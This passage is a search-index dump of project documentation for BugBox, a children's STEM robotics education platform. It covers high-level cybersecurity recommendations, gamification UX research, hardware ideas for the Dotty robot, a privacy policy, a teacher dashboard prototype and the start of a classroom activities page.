Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#automated-vulnerability-scanning","content":" Bugbox should conduct regular security audits using tools like OpenVAS, Nessus, or Qualys to identify common vulnerabilities such as SQL injection, cross-site scripting (XSS), and outdated software versions.  ","version":"Next","tagName":"h3"},{"title":"Static and Dynamic Code Analysis​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#static-and-dynamic-code-analysis","content":" Bugbox should implement static code analysis tools like SonarQube or Checkmarx to detect vulnerabilities in source code, and dynamic code analysis tools like Veracode or Burp Suite to test code execution in staging environments.  ","version":"Next","tagName":"h3"},{"title":"Third-Party Security Audits and Penetration Testing​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#third-party-security-audits-and-penetration-testing","content":" Bugbox should engage third-party security firms for annual penetration tests and audits to identify vulnerabilities that internal teams might overlook.  ","version":"Next","tagName":"h3"},{"title":"User Access Controls​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#user-access-controls","content":" ","version":"Next","tagName":"h2"},{"title":"Role-Based Access Control (RBAC)​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#role-based-access-control-rbac","content":" Bugbox must implement Role-Based Access Control (RBAC) to ensure users only access the resources necessary for their role. RBAC can be implemented using frameworks like Spring Security or Django’s authentication system.  Objective: To restrict user access based on their role within the organization.  ","version":"Next","tagName":"h3"},{"title":"Granular Permissions and Attribute-Based Access Control (ABAC)​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#granular-permissions-and-attribute-based-access-control-abac","content":" For more granular control, Bugbox can implement Attribute-Based Access Control (ABAC), which evaluates attributes like user location, time of day, or device used.  ","version":"Next","tagName":"h3"},{"title":"Logging and Auditing​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#logging-and-auditing","content":" All access control events should be logged and monitored regularly using tools like Splunk, ELK Stack, or Graylog.  ","version":"Next","tagName":"h3"},{"title":"Comprehensive Privacy Policy​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#comprehensive-privacy-policy","content":" ","version":"Next","tagName":"h2"},{"title":"Data Protection and Regulatory Compliance​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#data-protection-and-regulatory-compliance","content":" Bugbox must develop a privacy policy that complies with GDPR, COPPA, and FERPA. Data minimization practices should be implemented to collect only the necessary information.  ","version":"Next","tagName":"h3"},{"title":"Privacy by Design​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#privacy-by-design","content":" Bugbox should adopt a Privacy by Design approach, embedding privacy considerations into the platform architecture and development processes.  ","version":"Next","tagName":"h3"},{"title":"Incident Response Plan (IRP)​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#incident-response-plan-irp","content":" ","version":"Next","tagName":"h2"},{"title":"Establishing an Incident Response Team​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#establishing-an-incident-response-team","content":" Bugbox must develop an Incident Response Plan (IRP) that outlines the roles and responsibilities of the Incident Response Team (IRT). This team should include IT administrators, developers, legal advisors, and PR representatives.  ","version":"Next","tagName":"h3"},{"title":"Detection and Analysis​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#detection-and-analysis","content":" Bugbox should implement Intrusion Detection Systems (IDS) like Snort or Suricata to monitor network traffic, and Security Information and Event Management (SIEM) tools like Splunk or ELK Stack to aggregate logs.  ","version":"Next","tagName":"h3"},{"title":"Containment, Eradication, and Recovery​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#containment-eradication-and-recovery","content":" Bugbox’s IRT should act swiftly to contain threats and remove malicious software. Systems should be restored from backups, with validation to ensure no residual malware remains.  ","version":"Next","tagName":"h3"},{"title":"Post-Incident Analysis​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#post-incident-analysis","content":" A post-incident analysis should be conducted to identify root causes and update the IRP accordingly.  ","version":"Next","tagName":"h3"},{"title":"Secure Development Lifecycle​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#secure-development-lifecycle","content":" ","version":"Next","tagName":"h2"},{"title":"Secure Code Development​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#secure-code-development","content":" Bugbox’s development team should follow secure coding practices and integrate automated security testing tools like OWASP ZAP or SonarQube into its CI/CD pipeline.  ","version":"Next","tagName":"h3"},{"title":"Penetration Testing​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#penetration-testing","content":" Bugbox should conduct regular penetration tests to identify vulnerabilities that may not be caught during the development phase.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#conclusion","content":" Implementing these technical cybersecurity measures will significantly enhance Bugbox’s ability to protect its platform and users from evolving threats. By focusing on encryption, MFA, regular audits, access control, privacy compliance, and incident response, Bugbox can maintain a secure and trusted environment for educators and students. ","version":"Next","tagName":"h2"},{"title":"Moodboard","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/mood-board","content":"","keywords":"","version":"Next"},{"title":"Colors​","type":1,"pageTitle":"Moodboard","url":"/redback-documentation/docs/project-5/mood-board#colors","content":" A diverse color palette is featured, ranging from bright oranges (#FF5122) to soft pastels (mint, lavender, light green), evoking creativity and accessibility.  ","version":"Next","tagName":"h3"},{"title":"Typography​","type":1,"pageTitle":"Moodboard","url":"/redback-documentation/docs/project-5/mood-board#typography","content":" Two modern fonts are used: Montserrat and Poppins Medium, emphasizing clarity and approachability. The large headings and subheadings suggest a bold, educational tone suitable for kids and teachers.  ","version":"Next","tagName":"h3"},{"title":"Logos​","type":1,"pageTitle":"Moodboard","url":"/redback-documentation/docs/project-5/mood-board#logos","content":" The BugBox logo is displayed in three variations, incorporating different background colors and styles, symbolizing flexibility and adaptability.  ","version":"Next","tagName":"h3"},{"title":"UI Elements​","type":1,"pageTitle":"Moodboard","url":"/redback-documentation/docs/project-5/mood-board#ui-elements","content":" Buttons and UI components are shown in various shapes and colors, offering a vibrant and interactive interface design for the BugBox platform.  ","version":"Next","tagName":"h3"},{"title":"Imagery​","type":1,"pageTitle":"Moodboard","url":"/redback-documentation/docs/project-5/mood-board#imagery","content":" The images show kids happily engaging in robotic and team activities, reflecting the product's focus on STEM education, collaboration, and fun physical learning.  ","version":"Next","tagName":"h3"},{"title":"Final Moodboard​","type":1,"pageTitle":"Moodboard","url":"/redback-documentation/docs/project-5/mood-board#final-moodboard","content":"   The board communicates an energetic, inclusive, and innovative brand identity targeted toward young learners and educators. ","version":"Next","tagName":"h2"},{"title":"Report over the User Experience Design for Gamification element of BugBox","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Gamification Research/UX Design for Gamification element","content":"","keywords":"","version":"Next"},{"title":"User-Centered Approach and Motivation Psychology:​","type":1,"pageTitle":"Report over the User Experience Design for Gamification element of BugBox","url":"/redback-documentation/docs/project-5/Gamification Research/UX Design for Gamification element#user-centered-approach-and-motivation-psychology","content":" • Understand Intrinsic and Extrinsic Motivation: The UX design should address both intrinsic (internal rewards like personal satisfaction) and extrinsic motivation (external rewards like points or badges). For children aged 8-15, games that emphasize both learning as an exciting challenge and tangible rewards are crucial. Understanding the user’s goals, such as curiosity-driven exploration or competition, helps create tailored experiences.  For Example: In platforms like Duolingo, the user interface is designed to appeal to various age groups with vibrant colors, intuitive controls, and motivational rewards. When a user completes a lesson, Duolingo instantly provides positive reinforcement in the form of celebratory sounds, animations, and the accumulation of gems or points. Bugbox could implement a similar system, where finishing a task in subjects like math or science unlocks a fun animation with personalized messages to the learner.  • Empathy in Design: Gamified learning for children must prioritize empathy by accounting for varying levels of cognitive development. This involves designing with empathy for younger students who may require more intuitive interfaces and mature students needing more complex challenges.  For Example: Games like Minecraft: Education Edition consider both intrinsic and extrinsic motivation by allowing students to explore, build, and solve challenges in a creative way. Bugbox can offer personalized avatars and sandbox-style challenges where students can express their creativity while learning.  ","version":"Next","tagName":"h3"},{"title":"Progression Systems and Feedback Loops​","type":1,"pageTitle":"Report over the User Experience Design for Gamification element of BugBox","url":"/redback-documentation/docs/project-5/Gamification Research/UX Design for Gamification element#progression-systems-and-feedback-loops","content":" • Incremental Challenges (Flow Theory): By structuring tasks with a sense of progression through levels or achievements, UX should ensure learners stay in a &quot;flow state&quot; (a concept in psychology that emphasizes optimal engagement when tasks are neither too easy nor too hard). As students’ progress through learning goals in Bugbox, the challenges should scale in complexity, maintaining a perfect balance between frustration and boredom.  For Example: In the mobile app ClassDojo, students earn points for positive behaviour, and teachers provide immediate feedback. The UX emphasizes instant progress tracking through visual cues like progress bars, encouraging kids to maintain streaks of good behaviour. Similarly, Bugbox could include a learning streak system where completing daily tasks earns points toward levelling up their in-game persona.  • Granular Feedback: The feedback loops should be fine-tuned to offer not only instant responses (correct/incorrect) but also more detailed, helpful hints that promote learning. We could introduce narrative elements in the feedback that are not just simple text but adaptive prompts designed to reflect a child’s individual progress.  • Celebratory Animations: Reinforcing achievements using celebratory animations or sound effects can enhance motivation. Celebrating small wins with unique, animated badges or rewards makes the process enjoyable and encourage learners to continue.  For Example: Khan Academy uses gamified progress bars that show learners how much content they’ve covered and what's left. Each completed module rewards students with badges, motivating them to keep going. Bugbox can integrate a similar badge system where visual progress cues unlock new content, making learning feel like a quest.  ","version":"Next","tagName":"h3"},{"title":"Effective Use of Gamified Components​","type":1,"pageTitle":"Report over the User Experience Design for Gamification element of BugBox","url":"/redback-documentation/docs/project-5/Gamification Research/UX Design for Gamification element#effective-use-of-gamified-components","content":" • Leaderboards with Smart Competition Design: Leaderboards can be motivational, but design should avoid causing demotivation for lower-performing students. Instead, consider creating micro-leaderboards for smaller, more achievable groups or tasks. This encourages all students to feel a sense of accomplishment, even if they’re not at the top of the global leaderboard.  For Example: In Fitbit, leaderboards motivate users to keep up with their fitness goals by showing the progress of their friends. Bugbox’s leaderboards could be structured so that students can see their individual ranking within small groups or classrooms, encouraging friendly competition while being mindful of maintaining a supportive environment.  • Adaptive Badging System: A robust badging system should include dynamic badges that adapt based on user behaviour. For instance, students who frequently help others (if collaborative features are included) could earn &quot;helper&quot; badges, promoting not only individual success but also fostering a sense of community and social responsibility.  For Example: Prodigy Math Game uses an adaptive learning platform where students solve math problems to earn rewards in the form of outfits and pets. The challenges adjust in difficulty based on the learner’s progress. Bugbox can implement a system where students solve subject-related quizzes to unlock virtual pets or stickers that reflect their learning achievements.  • Challenges and Quests: UX should emphasize collaborative and solo quests that align with both learning outcomes and user enjoyment. Team quests foster communication and peer-to-peer learning, while individual quests provide self-paced learners with a rewarding path.  ","version":"Next","tagName":"h3"},{"title":"Visual Design and Interface Simplicity​","type":1,"pageTitle":"Report over the User Experience Design for Gamification element of BugBox","url":"/redback-documentation/docs/project-5/Gamification Research/UX Design for Gamification element#visual-design-and-interface-simplicity","content":" • Aesthetic Usability Effect: Children are especially drawn to interfaces that are visually attractive and intuitive. Colour schemes, character designs, and animations should appeal to their sense of play and imagination. Bugbox could take inspiration from popular games to ensure that its design is both familiar and appealing.  For Example: Animal Crossing: Pocket Camp offers a clean, colourful interface with simple navigation and fun animations. The game uses relaxing sound effects and consistent design elements that make it easy for young players to navigate. Bugbox could take inspiration from this design, creating a serene yet stimulating learning environment where students can move seamlessly between lessons, quizzes, and rewards with minimal effort.  • Consistency in Interface Elements: Ensure the consistency of visual elements like buttons, icons, and menus, making it easier for students to navigate. This reduces cognitive load and helps them focus on learning rather than figuring out how to use the platform. Children aged 8-15 have varying levels of digital literacy, so a consistent UX approach supports all learners.  • Animated Explanations and Visual Learning: Visual learning tools, such as animated instructions, help children comprehend abstract concepts more easily. Adding interactive elements and animations directly to learning content can break down complex ideas into digestible formats. These features should integrate seamlessly with the UI to maintain engagement without overwhelming the user.  For Example: The educational app Osmo uses tangible objects that interact with the screen, making learning interactive and immersive. Similarly, Bugbox could include touch-based interactions or drag-and-drop elements in their lessons to make the content more engaging for young learners.  ","version":"Next","tagName":"h3"},{"title":"Personalization and Adaptive Learning Paths​","type":1,"pageTitle":"Report over the User Experience Design for Gamification element of BugBox","url":"/redback-documentation/docs/project-5/Gamification Research/UX Design for Gamification element#personalization-and-adaptive-learning-paths","content":" • Tailored Learning Experience: Personalization should be a key feature in Bugbox, allowing students to progress at their own pace. The UX should enable customization of avatars, themes, and learning paths. By tracking student performance, Bugbox can offer adaptive challenges that cater to each child’s strengths and weaknesses, ensuring that learners remain engaged through content that feels tailored to them.  For Example: The app DreamBox Learning adapts in real-time based on students' performance. If a student struggles with a particular concept, the system provides additional scaffolding to help them understand it. Bugbox could employ similar adaptive learning paths, where children who struggle with certain lessons are guided through extra resources before advancing.  • Dynamic Learning Goals: UX design can include an adaptable dashboard that tracks a student’s performance and dynamically adjusts goals.  • Avatar Customization and Ownership: When children feel ownership over their avatars or online personas, their engagement tends to increase. Let students choose and evolve their avatars as they earn new achievements, reinforcing a sense of progress and personal involvement.  For Example: Adventure Academy offers a customizable avatar system, where children can choose outfits and accessories as they progress through academic challenges. This gives them a sense of ownership over their learning journey. Bugbox can allow students to customize their avatars and gain new outfits, accessories, or power-ups as they progress through different educational levels.  ","version":"Next","tagName":"h3"},{"title":"Social Integration and Peer Influence​","type":1,"pageTitle":"Report over the User Experience Design for Gamification element of BugBox","url":"/redback-documentation/docs/project-5/Gamification Research/UX Design for Gamification element#social-integration-and-peer-influence","content":" • Social Connectivity through Safe Interaction: UX design can facilitate collaboration and competition in a safe environment by allowing children to interact via structured, moderate chats or shared. Peer interactions, like joint projects or team-based challenges, encourage teamwork and communication. Social validation through peer encouragement can be a strong motivator for engagement.  For Example: Quizlet’s &quot;Live&quot; feature allows students to play in teams and compete against each other in a game-like format. This creates a collaborative learning environment where students engage with the material while also interacting with their peers. Bugbox could integrate team-based challenges where students solve problems together, promoting teamwork and social learning.  Also, the Minecraft: Education Edition has collaborative features where students work together to build structures and solve problems. Bugbox could introduce classroom-wide or small-group projects, where students collaborate on quests or challenges, rewarding them for working together.  • Teacher and Parent Dashboard: UX design should also account for ease of use by educators and parents. Clear, informative dashboards allow teachers and parents to track progress, identify areas of concern, and assign tasks directly through the platform. This integrated monitoring supports a collaborative environment between students, teachers, and parents.  ","version":"Next","tagName":"h3"},{"title":"Behavioural Design and Habit Formation​","type":1,"pageTitle":"Report over the User Experience Design for Gamification element of BugBox","url":"/redback-documentation/docs/project-5/Gamification Research/UX Design for Gamification element#behavioural-design-and-habit-formation","content":" • Positive Habit Formation through Gamified Daily Routines: UX should incorporate gentle nudges that encourage students to return to Bugbox regularly. Daily or weekly streak rewards, for instance, can foster a sense of routine, where kids are motivated to check in each day to earn extra points or badges.  For Example: Habitica, a productivity app that gamifies daily tasks, encourages users to maintain streaks of good behaviour. If users miss tasks, their avatar &quot;loses health,&quot; reinforcing daily engagement through a gamified interface. Bugbox can implement daily check-ins or streak rewards, where children earn extra points for logging in every day or completing assignments consistently.  • Progressive Unlocking of Features: The UX should tease future challenges and rewards y locking certain content behind milestones. By letting students see what they can unlock next, they become more invested in reaching the next level or completing the next task. The sense of anticipation drives continuous engagement.  For Example: Duolingo uses timed challenges and rewards for keeping a daily streak alive. Similarly, Bugbox could offer weekly or daily rewards for students who consistently log in and complete their tasks, encouraging habit formation.  ","version":"Next","tagName":"h3"},{"title":"Safety and Privacy​","type":1,"pageTitle":"Report over the User Experience Design for Gamification element of BugBox","url":"/redback-documentation/docs/project-5/Gamification Research/UX Design for Gamification element#safety-and-privacy","content":" • Child-Friendly Navigation and Data Security: UX in a child centric platform like BugBox should ensure that navigation is simple, keeping all interactions safe and secure. Avoid complicated signup processes or sharing personal data. Instead, provide an environment where children can safely explore learning materials and interact with peers under secure conditions.  For Example: Scratch, a programming platform for kids, maintains high privacy standards with strict moderation. Peer interaction is facilitated in a way that is safe for young users, ensuring their digital well-being. Bugbox could follow Scratch’s example by moderating social interactions, ensuring all conversations between students are safe and educational, while giving parents the ability to oversee their child’s activity.  • Parental Controls and Monitoring: UX design should integrate easy-to-sue parental controls, allowing parents to monitor usage and restrict certain features. Clear communication of what data being collected and how it’s used fosters trust from both parents and schools.  For Example: YouTube Kids offers a child-friendly navigation system where access to content is carefully curated, and parental controls are robust. Bugbox can incorporate simple, secure sign-ins with parental dashboards that allow parents to track their child's progress and restrict certain activities. ","version":"Next","tagName":"h3"},{"title":"Next-Gen Dotty Research","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/next-gen-dotty","content":"","keywords":"","version":"Next"},{"title":"The Current Bot​","type":1,"pageTitle":"Next-Gen Dotty Research","url":"/redback-documentation/docs/project-5/next-gen-dotty#the-current-bot","content":" In the existing configuration of the “Dotty” robot, the bot is powered by an Arduino Nano V3.0, supported by a custom PCB. This PCB enhances the user experience by embedding the motor drives directly and re-routing the pins of the board to logical spaces.  The grunt force behind the bot is two TT motors, running a dual shaft gearbox, and variable voltage up to 12 volts. In terms of capabilities, the bot recovers code through a command line interface connected via Micro USB to the bot, powered by Amazon EC2 which is fed from the BugBox Playground learning environment.  Present expandability functions are rather limited both by the PCB layout and by the functionality of the Arduino Nano board. Beyond the core platform, the bot has the ability to expand to contain two ultrasonic sensors and two infrared sensors. These two sensors will be continuing into the thought process of the new model, and thus not discussed in the proposed new components.  ","version":"Next","tagName":"h2"},{"title":"The Desired Outcome​","type":1,"pageTitle":"Next-Gen Dotty Research","url":"/redback-documentation/docs/project-5/next-gen-dotty#the-desired-outcome","content":" Looking into the long-term, the ideal outcome for the bot is to have an established base bot that can be effortlessly modified using pre-defined “modules” that are integrated both with the physical bot and through the Playground environment. A refreshed Dotty will provide more opportunities for students to learn, across a larger number of auxiliary accessories to the device. In upgrading the device in this manner, so too will the price become modular, with schools being able to customise their purchasing to suit the current needs of the students, only buying what the accessories necessary to them. Expanding on this platform provides further growth in the BugBox curriculum, with the opportunity to grow challenges and tasks based off the functionality of extra modules. Building a solid foundation will also ensure that BugBox is sustainable into the future, with a modular build allowing for upgrading components with less waste when inevitable future iterations occur.  ","version":"Next","tagName":"h2"},{"title":"Proposed Modules​","type":1,"pageTitle":"Next-Gen Dotty Research","url":"/redback-documentation/docs/project-5/next-gen-dotty#proposed-modules","content":" ","version":"Next","tagName":"h2"},{"title":"Sound Module​","type":1,"pageTitle":"Next-Gen Dotty Research","url":"/redback-documentation/docs/project-5/next-gen-dotty#sound-module","content":" Combining a small form factor microphone and speaker, Dotty would gain an enormous amount of functionality at a relatively low-cost and size. This dynamic duo would engage students through the following abilities:  Function to program sound effects to play back on the device, such as when running into objects and being responsive to objects through the two sensor modules.Using a combination of the microphone and quick swivel movements to recognise the location of where sound comes from.In a more advanced option, the implementation of basic voice commands could be added.  ","version":"Next","tagName":"h3"},{"title":"Button Module​","type":1,"pageTitle":"Next-Gen Dotty Research","url":"/redback-documentation/docs/project-5/next-gen-dotty#button-module","content":" Adding a small panel of tactile buttons to the top of the bot will add physical controls to the device. This addition could relay with the Playground to act as a trigger of sorts, with each button assigned to a group of blocks created by the user. Use cases could include:  Buttons to control the direction and speed of Dotty.A soundboard.Quick switching between different scripts.  ","version":"Next","tagName":"h3"},{"title":"Light / Display Module​","type":1,"pageTitle":"Next-Gen Dotty Research","url":"/redback-documentation/docs/project-5/next-gen-dotty#light--display-module","content":" Another responsive and useful addition would be through various types of light and display modules, which could be used through progression, moving up complexity of the module, such as:  Single LCDsLCD panelOLED displayTouch-screen displayE-ink display  These affordable options add another versatile learning experience, through the ability to program different light sequences and light displays. The more complex displays could be turned into fun displays such as a programmable “face” for the Dotty bot, which could be programmed by students to respond to events, potentially through gathered events of other sensors. A touch screen sensor could add even more reactivity to this, creating an interactive screen option, or working like the button module to deliver responsive feedback guided movements.  ","version":"Next","tagName":"h3"},{"title":"Inertia Module​","type":1,"pageTitle":"Next-Gen Dotty Research","url":"/redback-documentation/docs/project-5/next-gen-dotty#inertia-module","content":" Likely suited for the older side of BugBox’s demographic, an inertia module would provide useful statistics to the user. An inertia module would allow the bot to detect its speed, direction, and rotation status. This data could in-turn be used to provide feedback for other sensors, or simply returned to the user in order to complete assigned tasks.  ","version":"Next","tagName":"h3"},{"title":"Battery Module​","type":1,"pageTitle":"Next-Gen Dotty Research","url":"/redback-documentation/docs/project-5/next-gen-dotty#battery-module","content":" Albeit not an upgrade for the users, one upgrade to the bot itself that would improve overall functionality would be the addition of a LiPo battery pack. The full functionality of this addition would be enabled through either sourcing or creating a separate component that is capable of transmitting power to the battery pack, and data to the device, all though one single connection. Given the small battery usage of the device, it is likely that the short time Dotty is connected to the computer to get code would be enough to recharge any drained battery. LiPo batteries are also relatively cheap and have a greater capacity over alkaline batteries.  ","version":"Next","tagName":"h3"},{"title":"Standard Connection / Ease-Of-Use​","type":1,"pageTitle":"Next-Gen Dotty Research","url":"/redback-documentation/docs/project-5/next-gen-dotty#standard-connection--ease-of-use","content":" In order to fully utilise this new modular design, the bot will need the implementation of several standardised connections that work with all modules. To ensure cheap manufacturing and easy use for students, the easiest implementation of this of this may be through having several “patches” of either female or male pins in several key locations on the board, that has the minimal number of pins required to sufficiently run all the components. This would likely need research in trimester three by someone with PCB and IoT knowledge to fully maximise the design.  ","version":"Next","tagName":"h2"},{"title":"Board Improvements​","type":1,"pageTitle":"Next-Gen Dotty Research","url":"/redback-documentation/docs/project-5/next-gen-dotty#board-improvements","content":" The current board, an Arduino Nano, is likely not able to power or handle the data flow of several of these new modules. In researching this topic, many non-Arduino boards appear to be the best options. This however may not be the best option, as the current Playground environment has the avrgirl-arduino package as an integral part of the program, handling all code deployments to Dotty. By switching to a non-Arduino board, this would also require a full rebuild of the backend, potentially meaning BugBox would have to develop their own solution to meet the needs of the particular board.  So considering this, the Arduino Mega may be the best option going forward. It offers significantly more memory (30kB vs 248kB when removing bootloader usage) which is likely needed for the display and sound modules, nearly three times as many pins, and four serial ports which could be used for the modules.  The Mega does come with a substantial price increase over the Nano, however for the longevity of the device, this price could be justified. The older Nano and PCBs could still be used in basic classes to avoid waste. ","version":"Next","tagName":"h2"},{"title":"Privacy Policy","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/privacy-policy","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Privacy Policy","url":"/redback-documentation/docs/project-5/privacy-policy#1-introduction","content":" Bugbox is committed to safeguarding your privacy. This Privacy Policy explains how we collect, use, and protect your personal data when you use the Bugbox platform.  ","version":"Next","tagName":"h3"},{"title":"2. Information Collection​","type":1,"pageTitle":"Privacy Policy","url":"/redback-documentation/docs/project-5/privacy-policy#2-information-collection","content":" We collect the following types of information:  Personal Information: Names, email addresses, and login details provided during account creation.Usage Data: Information on platform interactions, progress tracking, and performance analytics.  ","version":"Next","tagName":"h3"},{"title":"3. Use of Information​","type":1,"pageTitle":"Privacy Policy","url":"/redback-documentation/docs/project-5/privacy-policy#3-use-of-information","content":" We use collected information to:  Personalize the user experience.Track educational progress and provide feedback.Enhance platform performance and troubleshoot issues.Comply with legal and educational obligations.  ","version":"Next","tagName":"h3"},{"title":"4. Data Storage and Security​","type":1,"pageTitle":"Privacy Policy","url":"/redback-documentation/docs/project-5/privacy-policy#4-data-storage-and-security","content":" We employ industry-standard encryption, secure servers, and access controls to protect user data. While we strive to safeguard all information, no system can guarantee absolute security.  ","version":"Next","tagName":"h3"},{"title":"5. Parental Consent​","type":1,"pageTitle":"Privacy Policy","url":"/redback-documentation/docs/project-5/privacy-policy#5-parental-consent","content":" For users under 16, we require parental or guardian consent before collecting personal information. Teachers must ensure that all necessary permissions are in place for their students.  ","version":"Next","tagName":"h3"},{"title":"6. Cookies and Tracking​","type":1,"pageTitle":"Privacy Policy","url":"/redback-documentation/docs/project-5/privacy-policy#6-cookies-and-tracking","content":" We use cookies to analyse user behaviour and improve the platform. Users can disable cookies in their browser settings but may experience reduced functionality.  ","version":"Next","tagName":"h3"},{"title":"7. User Rights​","type":1,"pageTitle":"Privacy Policy","url":"/redback-documentation/docs/project-5/privacy-policy#7-user-rights","content":" Users can request access to their data, make corrections, or request deletion of their accounts by contacting Bugbox support at info@bugbox.com.  ","version":"Next","tagName":"h3"},{"title":"8. Third-Party Services​","type":1,"pageTitle":"Privacy Policy","url":"/redback-documentation/docs/project-5/privacy-policy#8-third-party-services","content":" Bugbox may integrate with third-party tools (e.g., hosting providers or analytics platforms) to enhance platform functionality. We ensure these providers adhere to strict data protection standards.  ","version":"Next","tagName":"h3"},{"title":"9. Policy Updates​","type":1,"pageTitle":"Privacy Policy","url":"/redback-documentation/docs/project-5/privacy-policy#9-policy-updates","content":" This Privacy Policy may be updated periodically to reflect changes in laws or platform features. Users will be notified of updates through the website.  ","version":"Next","tagName":"h3"},{"title":"10. Contact Information​","type":1,"pageTitle":"Privacy Policy","url":"/redback-documentation/docs/project-5/privacy-policy#10-contact-information","content":" For questions or concerns about these terms, please contact us at info@bugbox.com. ","version":"Next","tagName":"h3"},{"title":"Teacher Dashboard","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/teacher-dashboard","content":"","keywords":"","version":"Next"},{"title":"Figma Prototyping​","type":1,"pageTitle":"Teacher Dashboard","url":"/redback-documentation/docs/project-5/teacher-dashboard#figma-prototyping","content":"   You can explore the development of the dashboard through the following Figma links:  tip To trial the teacher dashboard, click on the Prototype Mode!! If you don't know where to click, click on the page randomly and options will pop up for you.  Development mode  Prototype mode  ","version":"Next","tagName":"h2"},{"title":"Navigating the Prototype​","type":1,"pageTitle":"Teacher Dashboard","url":"/redback-documentation/docs/project-5/teacher-dashboard#navigating-the-prototype","content":"   To navigate the prototype, teachers can click on the settings button located on the main code playground page. This action opens the login page, where they can enter their credentials to access the dashboard.    0: Main Page​  Once logged in, teachers can easily switch between tabs by clicking on the tab titles on the left side of the screen. Each tab is color-coded, providing visual cues for easier navigation. As teachers hover over the tabs, they will change to their respective colors, enhancing the user experience and making it clear which section they are in.    1: Student Tab​  The Student Tab provides a comprehensive list of students, showcasing their individual information and progress. Teachers can easily view and track each student's learning journey. By clicking on any of the progress bars next to a student’s name, teachers are directed to Tab 3, where they can delve deeper into specific student metrics and performance details.      2: Activities Tab​  In the Activities Page, teachers have the ability to assign tasks and activities to their students. This feature allows for customized learning experiences, enabling educators to tailor assignments based on the needs and progress of their students. Teachers can easily manage and distribute tasks, ensuring that every student remains engaged and challenged.    3: Report Tab​  The Report Page offers detailed insights into a student's individual progress. Here, teachers can analyze performance metrics, identify strengths and weaknesses, and make informed decisions about future instruction. This tab serves as a vital resource for understanding each student's capabilities and areas needing improvement.    4: Freeze/Unfreeze Tab​  The Freeze/Unfreeze Tab is a valuable tool for classroom management. If a teacher needs to pause students' activities to address the class, they can freeze the students' screens, allowing for focused instruction without distractions. Once the discussion is complete, teachers can easily unfreeze the screens, enabling students to resume their work.    In addition to these functionalities, the dashboard enhances usability with visual feedback; hovering over the tabs on the left changes them to their respective colors, including the freeze and unfreeze buttons. This feature not only improves the aesthetic appeal but also provides clear, immediate feedback to the teacher, creating a user-friendly experience.    ","version":"Next","tagName":"h3"},{"title":"Classroom Activities","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities","content":"","keywords":"","version":"Next"},{"title":"What does it Demonstrates​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#what-does-it-demonstrates","content":" These activities showcase my ability to create educational content aligned with the goals of the BugBox project. They are designed to make complex concepts accessible to younger audiences, integrating STEM principles with creativity and real-world problem-solving.  tip Getting Started Tips for Educators:​ 1. Familiarize Yourself with BugBox:​ Spend some time with the BugBox robot and its programming environment before class to confidently guide your students. 2. Test the Setup in Advance:​ Run a trial of the activity setup (habitat or obstacle course) to ensure everything functions smoothly during the lesson. 3. Start Small with Programming:​ Begin with simple commands, especially for students new to programming, and gradually introduce more complex tasks. 4. Encourage Problem-Solving:​ Remind students that programming involves trial and error. Encourage frequent testing and adjustments to promote a problem-solving mindset. 5. Adapt to Different Skill Levels:​ Provide challenges for advanced students while offering simpler tasks for beginners, ensuring engagement for all learners. 6. Time Management:​ Use a timer to keep the activity on track, ensuring that all groups have sufficient time to complete their tasks.  ","version":"Next","tagName":"h2"},{"title":"Activity 1: Robotic Rangers: Protecting Endangered 